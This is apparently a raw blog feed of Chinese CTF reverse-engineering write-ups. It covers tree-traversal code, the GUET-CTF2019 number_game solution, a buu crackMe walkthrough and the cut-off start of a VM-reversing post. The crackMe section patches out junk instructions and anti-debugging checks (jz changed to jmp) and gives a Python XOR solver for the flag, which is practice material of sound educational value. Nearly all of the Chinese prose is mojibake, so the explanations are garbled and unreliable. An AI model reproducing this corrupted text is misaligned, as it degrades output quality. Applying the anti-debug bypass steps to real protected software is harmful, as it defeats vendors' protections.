å³</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrder</span><span class="params">(BT* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL &quot;</span>); <span class="comment">// å¦‚æœä¸ºç©ºï¼Œå°±æ‰“å°</span></span><br><span class="line"><span class="keyword">return</span>;      <span class="comment">// å½“å‰å‡½æ•°ç»“æŸ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">InOrder</span>(root-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, root-&gt;data);</span><br><span class="line"><span class="built_in">InOrder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%20%282%29.png" alt="ä¸­åºéå† (2)"></p><h5 id="3ã€ååºéå†"><a href="#3ã€ååºéå†" class="headerlink" title="3ã€ååºéå†"></a>3ã€<strong>ååºéå†</strong></h5><p>ä»£ç æ¼”ç¤ºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ååº å·¦ å³ æ ¹</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PosOrder</span><span class="params">(BT* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL &quot;</span>); <span class="comment">// å¦‚æœä¸ºç©ºï¼Œå°±æ‰“å°</span></span><br><span class="line"><span class="keyword">return</span>;      <span class="comment">// å½“å‰å‡½æ•°ç»“æŸ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PosOrder</span>(root-&gt;left);</span><br><span class="line"><span class="built_in">PosOrder</span>(root-&gt;right);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, root-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E5%90%8E%E5%BA%8F.png" alt="ååº"></p><h5 id="4ã€å±‚æ¬¡éå†"><a href="#4ã€å±‚æ¬¡éå†" class="headerlink" title="4ã€å±‚æ¬¡éå†"></a>4ã€å±‚æ¬¡éå†</h5><p>ä»£ç æ¼”ç¤ºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–é˜Ÿåˆ— </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue *Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾…åŠ©é˜Ÿåˆ—çš„å…¥é˜Ÿæ“ä½œ </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(SqQueue *Q, QElemType q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((Q-&gt;rear + <span class="number">1</span>) % MAXSIZES == Q-&gt;front)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">Q-&gt;data[Q-&gt;rear] = q;</span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % MAXSIZES;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾…åŠ©é˜Ÿåˆ—çš„å‡ºé˜Ÿæ“ä½œ </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(SqQueue *Q, QElemType *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">*q = Q-&gt;data[Q-&gt;front];</span><br><span class="line">Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % MAXSIZES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LevelOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SqQueue Q;</span><br><span class="line"><span class="built_in">InitQueue</span>(&amp;Q);<span class="comment">// åˆå§‹åŒ–è¾…åŠ©é˜Ÿåˆ—</span></span><br><span class="line">BiTree p;</span><br><span class="line"><span class="built_in">EnQueue</span>(&amp;Q, T);<span class="comment">// å°†æ ¹èŠ‚ç‚¹å…¥é˜Ÿ</span></span><br><span class="line"><span class="keyword">while</span>(Q.front != Q.rear)<span class="comment">// é˜Ÿåˆ—ä¸ç©ºåˆ™å¾ªç¯ </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DeQueue</span>(&amp;Q, &amp;p);<span class="comment">// é˜Ÿå¤´ç»“ç‚¹å‡ºé˜Ÿ</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnQueue</span>(&amp;Q, p-&gt;lchild);<span class="comment">// å·¦å­æ ‘ä¸ç©º,åˆ™å·¦å­æ ‘æ ¹èŠ‚ç‚¹å…¥é˜Ÿ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnQueue</span>(&amp;Q, p-&gt;rchild);<span class="comment">// å³å­æ ‘ä¸ç©º,åˆ™å³å­æ ‘æ ¹èŠ‚ç‚¹å…¥é˜Ÿ </span></span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E5%B1%82%E6%AC%A1.png" alt="å±‚æ¬¡"></p><hr><h2 id="GUET-CTF2019-number-game"><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h2><p>ä¸‹è½½å®Œæ‹–å…¥010æ˜¯elfæ–‡ä»¶ï¼Œç›´æ¥æ‹–å…¥64ä½ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/main.png" alt="main"></p><p>ç”±sub_4006D6å¯çŸ¥flagé•¿åº¦ä¸º10</p><p>sub_400758æ˜¯ç”¨äºŒå‰æ ‘æŠŠflagä¼ ç»™äº†v4ï¼Œ</p><p>å…ˆç»™æœ¬èº«èµ‹å€¼èµ‹å€¼ï¼Œ</p><p>ç„¶åæŠŠå·¦ç»“ç‚¹æ¥æŠŠå¥‡æ•°ä½è¿›è¡Œèµ‹å€¼</p><p>å³ç»“ç‚¹æŠŠå¶æ•°ä½è¿›è¡Œèµ‹å€¼</p><p>sub_400807è¿™æ˜¯ä¸ªäºŒå‰æ ‘çš„<strong>ä¸­åºéå†</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="ä¸­åºéå†"></p><p>sub_400881æ˜¯å§v7çš„å€¼è¾“å…¥åˆ°ç‰¹å®šçš„åœ°å€ä¸­</p><p>sub_400917æ˜¯ä¸ªæ£€æŸ¥å‡½æ•°ï¼Œè·Ÿè¿›æŸ¥çœ‹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E6%95%B0%E7%8B%AC.png" alt="æ•°ç‹¬"></p><p>è¿™æ˜¯ä¸ªäºŒç»´æ•°ç»„çš„æ£€æŸ¥å‡½æ•°è¦æ±‚åœ¨ä¸€ä¸ª5*5çš„äºŒç»´æ•°ç»„ä¸­ æ¯è¡Œ or æ¯åˆ— ä¸èƒ½æœ‰ç›¸åŒçš„æ•°å­— </p><p>è·Ÿè¿›unk_601060å¹¶ä¸”å°†å®ƒæŒ‰ç…§5*5çš„æ ¼å¼å±•å¼€å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14#23</span><br><span class="line">30#1#</span><br><span class="line">0#23#</span><br><span class="line">#3##0</span><br><span class="line">42##1</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸ªæ•°ç‹¬æ¸¸æˆï¼ŒæŠŠæ¯ä¸ªæ•°å­—å†™å‡ºæ¥ä¹‹å</p><p>æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³çš„é¡ºåºæ’åˆ—å¥½å</p><p>æŒ‰ç…§äºŒå‰æ ‘çš„ä¸­åºæ’åˆ—é€†å›å»å°±æ˜¯flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŠ¨è°ƒã€‘ã€åè°ƒè¯•ç»•è¿‡ã€‘ã€èŠ±æŒ‡ä»¤nopã€‘ã€buuã€‘buu_crackMe</title>
      <link href="/2024/07/22/%E3%80%90%E5%8A%A8%E8%B0%83%E3%80%91%E3%80%90%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87%E3%80%91%E3%80%90%E8%8A%B1%E6%8C%87%E4%BB%A4nop%E3%80%91%E3%80%90buu%E3%80%91buu_crackMe/"/>
      <url>/2024/07/22/%E3%80%90%E5%8A%A8%E8%B0%83%E3%80%91%E3%80%90%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87%E3%80%91%E3%80%90%E8%8A%B1%E6%8C%87%E4%BB%A4nop%E3%80%91%E3%80%90buu%E3%80%91buu_crackMe/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€åŠ¨è°ƒã€‘ã€åè°ƒè¯•ç»•è¿‡ã€‘ã€èŠ±æŒ‡ä»¤nopã€‘ã€buuã€‘buu-crackMe"><a href="#ã€åŠ¨è°ƒã€‘ã€åè°ƒè¯•ç»•è¿‡ã€‘ã€èŠ±æŒ‡ä»¤nopã€‘ã€buuã€‘buu-crackMe" class="headerlink" title="ã€åŠ¨è°ƒã€‘ã€åè°ƒè¯•ç»•è¿‡ã€‘ã€èŠ±æŒ‡ä»¤nopã€‘ã€buuã€‘buu_crackMe"></a>ã€åŠ¨è°ƒã€‘ã€åè°ƒè¯•ç»•è¿‡ã€‘ã€èŠ±æŒ‡ä»¤nopã€‘ã€buuã€‘buu_crackMe</h1><hr><p><strong>ä¹Ÿæ˜¯å»æ‰¾äº†ä¸€ä¸ªwp+å­¦é•¿å¸®åŠ©æ‰å‡ºçš„è¿™é“é¢˜</strong></p><hr><p>å·®å£³æ— å¯32ä½è¿›å…¥idaè¿›å…¥mainå‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/main.png" alt="main"></p><p>å‘ç°4011A0è¿™ä¸ªå‡½æ•°å¥½åƒæœªè¢«åˆ†ææˆåŠŸ</p><p>è·Ÿè¿›æŸ¥çœ‹ï¼Œå‘ç°æœ‰çº¢å</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/4011A0.png" alt="4011A0"></p><p>æŠŠè¿™é‡Œçš„èŠ±æŒ‡ä»¤ç»™nopæ‰ï¼š</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8F%8D%E5%A4%8D%E6%A8%AA%E8%B7%B3%E7%9A%84%E8%8A%B1%E6%8C%87%E4%BB%A4.png" alt="åå¤æ¨ªè·³çš„èŠ±æŒ‡ä»¤"></p><p>ç„¶åæŠŠçº¢åéƒ¨åˆ†å…¨éƒ¨é€‰ä¸­ç„¶åæ‘Pè¿›è¡Œé‡æ–°åˆ†ææˆå‡½æ•°ï¼Œ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8E%BB%E8%8A%B1%E5%90%8E.png" alt="å»èŠ±å"></p><p>ç„¶åæ‘f5æŸ¥çœ‹ä¼ªå‡½æ•°ï¼Œæ•´ç†åå¦‚ä¸‹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/congratulation.png" alt="congratulation"></p><p>BYDè¢«éª—äº†</p><p>å›åˆ°mainå‡½æ•°æ•´ç†ä¸€ä¸‹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/main_fix.png" alt="main_fix"></p><p>æŸ¥çœ‹sub_401830</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/401830.png" alt="401830"></p><p>æœ‰ç‚¹é•¿ï¼Œåˆ†æä¸€ä¸‹ï¼Œ</p><p>ä¸ŠåŠéƒ¨åˆ†ä¸»è¦è¿˜æ˜¯æ£€éªŒæ˜¯ä¸æ˜¯å­—ç¬¦ä¸²ä¸€ç±»çš„ç¨‹åºï¼Œä½†æ˜¯è¦æ³¨æ„è¿™ä¸ªåè°ƒè¯•</p><p>ä»**while ( v5 &lt; 8 )**å¼€å§‹åˆ†æ</p><p>è¿™ä¸ªv5&lt;8å°±å·²ç»è¯´æ˜äº†å¯†ç æ˜¯8ä½</p><p>é¦–å…ˆæ˜¯è¦å¯¹byte_416050è¿›è¡Œä¸€ç³»åˆ—æ“ä½œ</p><p>ç„¶åæ£€æµ‹è°ƒè¯•ï¼Œå¦‚æœæ˜¯åœ¨è°ƒè¯•çŠ¶æ€å°±è¿›å…¥è¯¥è¯­å¥ï¼ˆä½†æ˜¯æ­£å¸¸çš„æƒ…å†µä¸‹ä¸åº”è¯¥æ‰§è¡Œå®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ç­‰ä¸‹ç”¨idaè°ƒè¯•çš„æ—¶å€™è¦ç»•è¿‡åè°ƒè¯•ï¼‰</p><p>ç„¶åæ‰§è¡Œå¯†ç åŠ å¯† v16[v5] &#x3D; byte_416050[(v7 + v12)] ^ v15[v4 - 1]</p><p>v16å°±æ˜¯åŠ å¯†åçš„å¯†ç ï¼Œå®ƒå‚ä¸ä¸‹ä¸€ä¸ªå‡½æ•°çš„åŠ å¯†</p><p>ç´§ç€åˆ°æ¥çš„æ˜¯å¦ä¸€ä¸ªè°ƒè¯•æ£€æµ‹</p><p>ç„¶åè¿›å…¥åˆ°sub_401710ï¼ˆåŠ å¯†å‡½æ•°ï¼‰ç”¨å¤„ç†è¿‡çš„byte_416050ï¼Œè¾“å…¥çš„ç”¨æˆ·åå’Œå¾ªç¯ç³»æ•°v5è¿›è¡Œä¸€æ®µå¤„ç†</p><p>æœ€åè¿›å…¥åˆ°sub_401470(v16, &amp;v13)å’Œå¯†æ–‡è¿›è¡Œæ¯”å¯¹</p><hr><p>è·Ÿè¿›sub_401470(v16, &amp;v13)ï¼Œå‘ç°è¿™ä¹Ÿæ˜¯æœ‰åè°ƒè¯•ä¸Šäº†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/sub_401470.png" alt="sub_401470"></p><p>ç°åœ¨è¿›è¡Œç»•è¿‡åè°ƒè¯•</p><p>é€‰ä¸­NtCurrentPebï¼Œæ‘Tab,å°±ä¼šè¿›å…¥åˆ°è¯¥å‡½æ•°æ‰€åœ¨çš„æ±‡ç¼–æ®µå†…</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8F%8D%E8%B0%83%E8%AF%951.png" alt="åè°ƒè¯•1"></p><p>è“è‰²çš„æ¡†å°±æ˜¯åè°ƒè¯•ä»£ç æ‰€åœ¨çš„æ±‡ç¼–å—ï¼Œç„¶åæŠŠ <strong>jzæ”¹æˆjmp</strong> å³å¯ï¼ˆæ”¹è“è‰²æ¡†çš„å°±è¡Œï¼‰</p><p>ï¼ˆåŠ¨è°ƒçš„æ—¶å€™æ”¹zfå€¼ä¹Ÿè¡Œï¼Œä¸è¿‡è¿™é¢˜è¿™ä¹ˆæ”¹æœ‰ç‚¹éº»çƒ¦ï¼‰</p><p>å†æ‘F5æŸ¥çœ‹ä¼ªä»£ç </p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8E%BB%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%AF%86%E6%96%87.png" alt="å»åè°ƒè¯•-å¯†æ–‡"></p><p>è§‰å¾—è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡æŠŠaamå’Œdaaçµ¦nopæ‰å°±å¯ä»¥äº†</p><p>å¾—åˆ°å¯†æ–‡ï¼š</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%AF%86%E6%96%87.png" alt="å¯†æ–‡"></p><p>å¯†æ–‡æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbappsec</span><br></pre></td></tr></table></figure><p>ç„¶åå›åˆ°ä¸Šä¸€çº§å‡½æ•°ä¸­ï¼Œç»™ä¸‰ä¸ªåè°ƒè¯•çš„ <strong>æ±‡ç¼–éƒ¨åˆ†çš„jz</strong> æ‰“ä¸Šæ–­ç‚¹</p><p>ä¸€ä¼šåŠ¨è°ƒå†æŠŠä»–ä»¬æ”¹æˆjmpï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆï¼Œæˆ‘çš„idaå°±è¿™æ ·ï¼‰</p><p>ä»¥é˜²ç›´æ¥è¿›å…¥åˆ°è¯­å¥ï¼Œåœ¨è¿™é‡Œå†æ‰“ä¸ªæ–­ç‚¹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E6%96%AD%E7%82%B9.png" alt="æ–­ç‚¹"></p><p>å›åˆ°ä¼ªä»£ç è·Ÿè¿›ä¸‹åŠ å¯†å‡½æ•°sub_401710</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/enc.png" alt="enc"></p><p>è¿™ç¬¬ä¸€ä¸ªifçš„ä¸€å¨ä¹Ÿæ˜¯ä¸ªåè°ƒè¯•ï¼Œæ‰€ä»¥æ­£ç¡®çš„åŠ å¯†åº”è¯¥æ˜¯ä¸‹é¢çš„else ifâ€”â€”else</p><p>v4æ˜¯ç”¨æˆ·åçš„é•¿åº¦ï¼Œv3çš„æœ€å¤§å€¼æ˜¯å¯†ç çš„é•¿åº¦ä¸º8</p><p>æ‰€ä»¥v3æ’å°äºv4ï¼Œåªæ‰§è¡Œ <strong>else if</strong> çš„åŠ å¯†</p><p>a1æ˜¯ç»è¿‡ä¸Šä¸€ä¸ªå‡½æ•°åŠ å¯†åçš„å¯†ç ï¼ˆä¸Šä¸€å±‚çš„åŠ å¯†v16[v5] &#x3D; byte_416050[(v7 + v12)] ^ v15[v4 - 1]ï¼‰</p><p>a2æ˜¯ç”¨æˆ·åï¼Œæ‰€ä»¥åŠ å¯†å°±æ˜¯æŠŠæ­£ç¡®å¯†ç å’Œç”¨æˆ·åå‰å…«ä½è¿›è¡Œå¼‚æˆ–</p><p>å›åˆ°ä¸Šä¸€å±‚çš„å‡½æ•°ç‚¹å‡»v16[v5] &#x3D; byte_416050[(v7 + v12)] ^ v15[v4 - 1]</p><p>tabè·Ÿè¿›æ±‡ç¼–ä»£ç </p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/xor.png" alt="xor"></p><p>movzx ecx, [ebp+var_209]æ˜¯å°†byte_416050çš„å€¼å­˜å…¥ecxï¼Œæ­¤å¤„çš„ecxçš„å€¼å³ä¸ºæˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å€¼ï¼</p><p>æ‰€ä»¥å¼€å¯åŠ¨è°ƒ</p><p>è¾“å…¥ç”¨æˆ·åå’Œéšä¾¿8ä½å¯†ç </p><p>åœåœ¨äº†æˆ‘ä»¬åˆšæ‰æ‰“æ–­ç‚¹çš„åœ°æ–¹ï¼Œæˆ‘ä»¬éœ€è¦æŠŠä¸Šé¢è¯´è¦æ”¹çš„jzæ”¹æˆjmp</p><p>ç„¶åè¿è¡Œè®©æŒ‡ä»¤è¿è¡Œåœ¨è¿™é‡Œ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/crackMe/%E5%8A%A8%E8%B0%831.png" alt="åŠ¨è°ƒ1"></p><p>ç„¶åæ‘å•æ­¥æ‰§è¡ŒæŸ¥çœ‹ecxçš„å€¼å°±å¯ä»¥äº†ï¼Œ</p><p>æœ€ç»ˆå¾—åˆ°å¼‚æˆ–çš„å€¼ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd</span><br></pre></td></tr></table></figure><p>ç°åœ¨å¯ä»¥å†™è„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor = [<span class="number">0x2a</span>, <span class="number">0xd7</span>, <span class="number">0x92</span>, <span class="number">0xe9</span>, <span class="number">0x53</span>, <span class="number">0xe2</span>, <span class="number">0xc4</span>, <span class="number">0xcd</span>]</span><br><span class="line">enc = <span class="string">&#x27;dbappsec&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">hex</span>(xor[i] ^ <span class="built_in">ord</span>(enc[i]))[<span class="number">2</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å¾—å‡ºçš„flagå†æ‰¾ä¸ªåœ¨çº¿åŠ å¯†ç½‘ç«™è¿›è¡ŒåŠ å¯†å°±å¯ä»¥äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€vmé€†å‘ã€‘ã€buuã€‘[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal</title>
      <link href="/2024/07/22/%E3%80%90vm%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/"/>
      <url>/2024/07/22/%E3%80%90vm%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€vmé€†å‘ã€‘ã€buuã€‘-ç½‘é¼æ¯-2020-é’é¾™ç»„-singal"><a href="#ã€vmé€†å‘ã€‘ã€buuã€‘-ç½‘é¼æ¯-2020-é’é¾™ç»„-singal" class="headerlink" title="ã€vmé€†å‘ã€‘ã€buuã€‘[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal"></a>ã€vmé€†å‘ã€‘ã€buuã€‘[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal</h1><hr><p>å»ºè®®å…ˆæŠŠè¿™ä¸ªçœ‹ä¸‹ï¼Œè™½ç„¶è¿™é“é¢˜æ²¡è¿™ä¹ˆå¤æ‚</p><p>ã€ç³»ç»Ÿå­¦ä¹ vmè™šæ‹Ÿæœºé€†å‘ã€‘<a href="https://blog.csdn.net/weixin_43876357/article/details/108570305?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172161411916800178553714%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172161411916800178553714&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-108570305-null-null.142">https://blog.csdn.net/weixin_43876357/article/details/108570305?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172161411916800178553714%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=172161411916800178553714&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-108570305-null-null.142</a></p><hr><p>æŸ¥å£³æ— å£³32ä½è¿›ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/main.png" alt="main"></p><p>å°†unk_403040èµ‹å€¼ç»™v4</p><p>è·Ÿè¿›vm_operad</p><p>å¤ªé•¿äº†ï¼Œç›´æ¥é»è´´ä»£ç äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vm_operad</span><span class="params">(<span class="type">int</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> 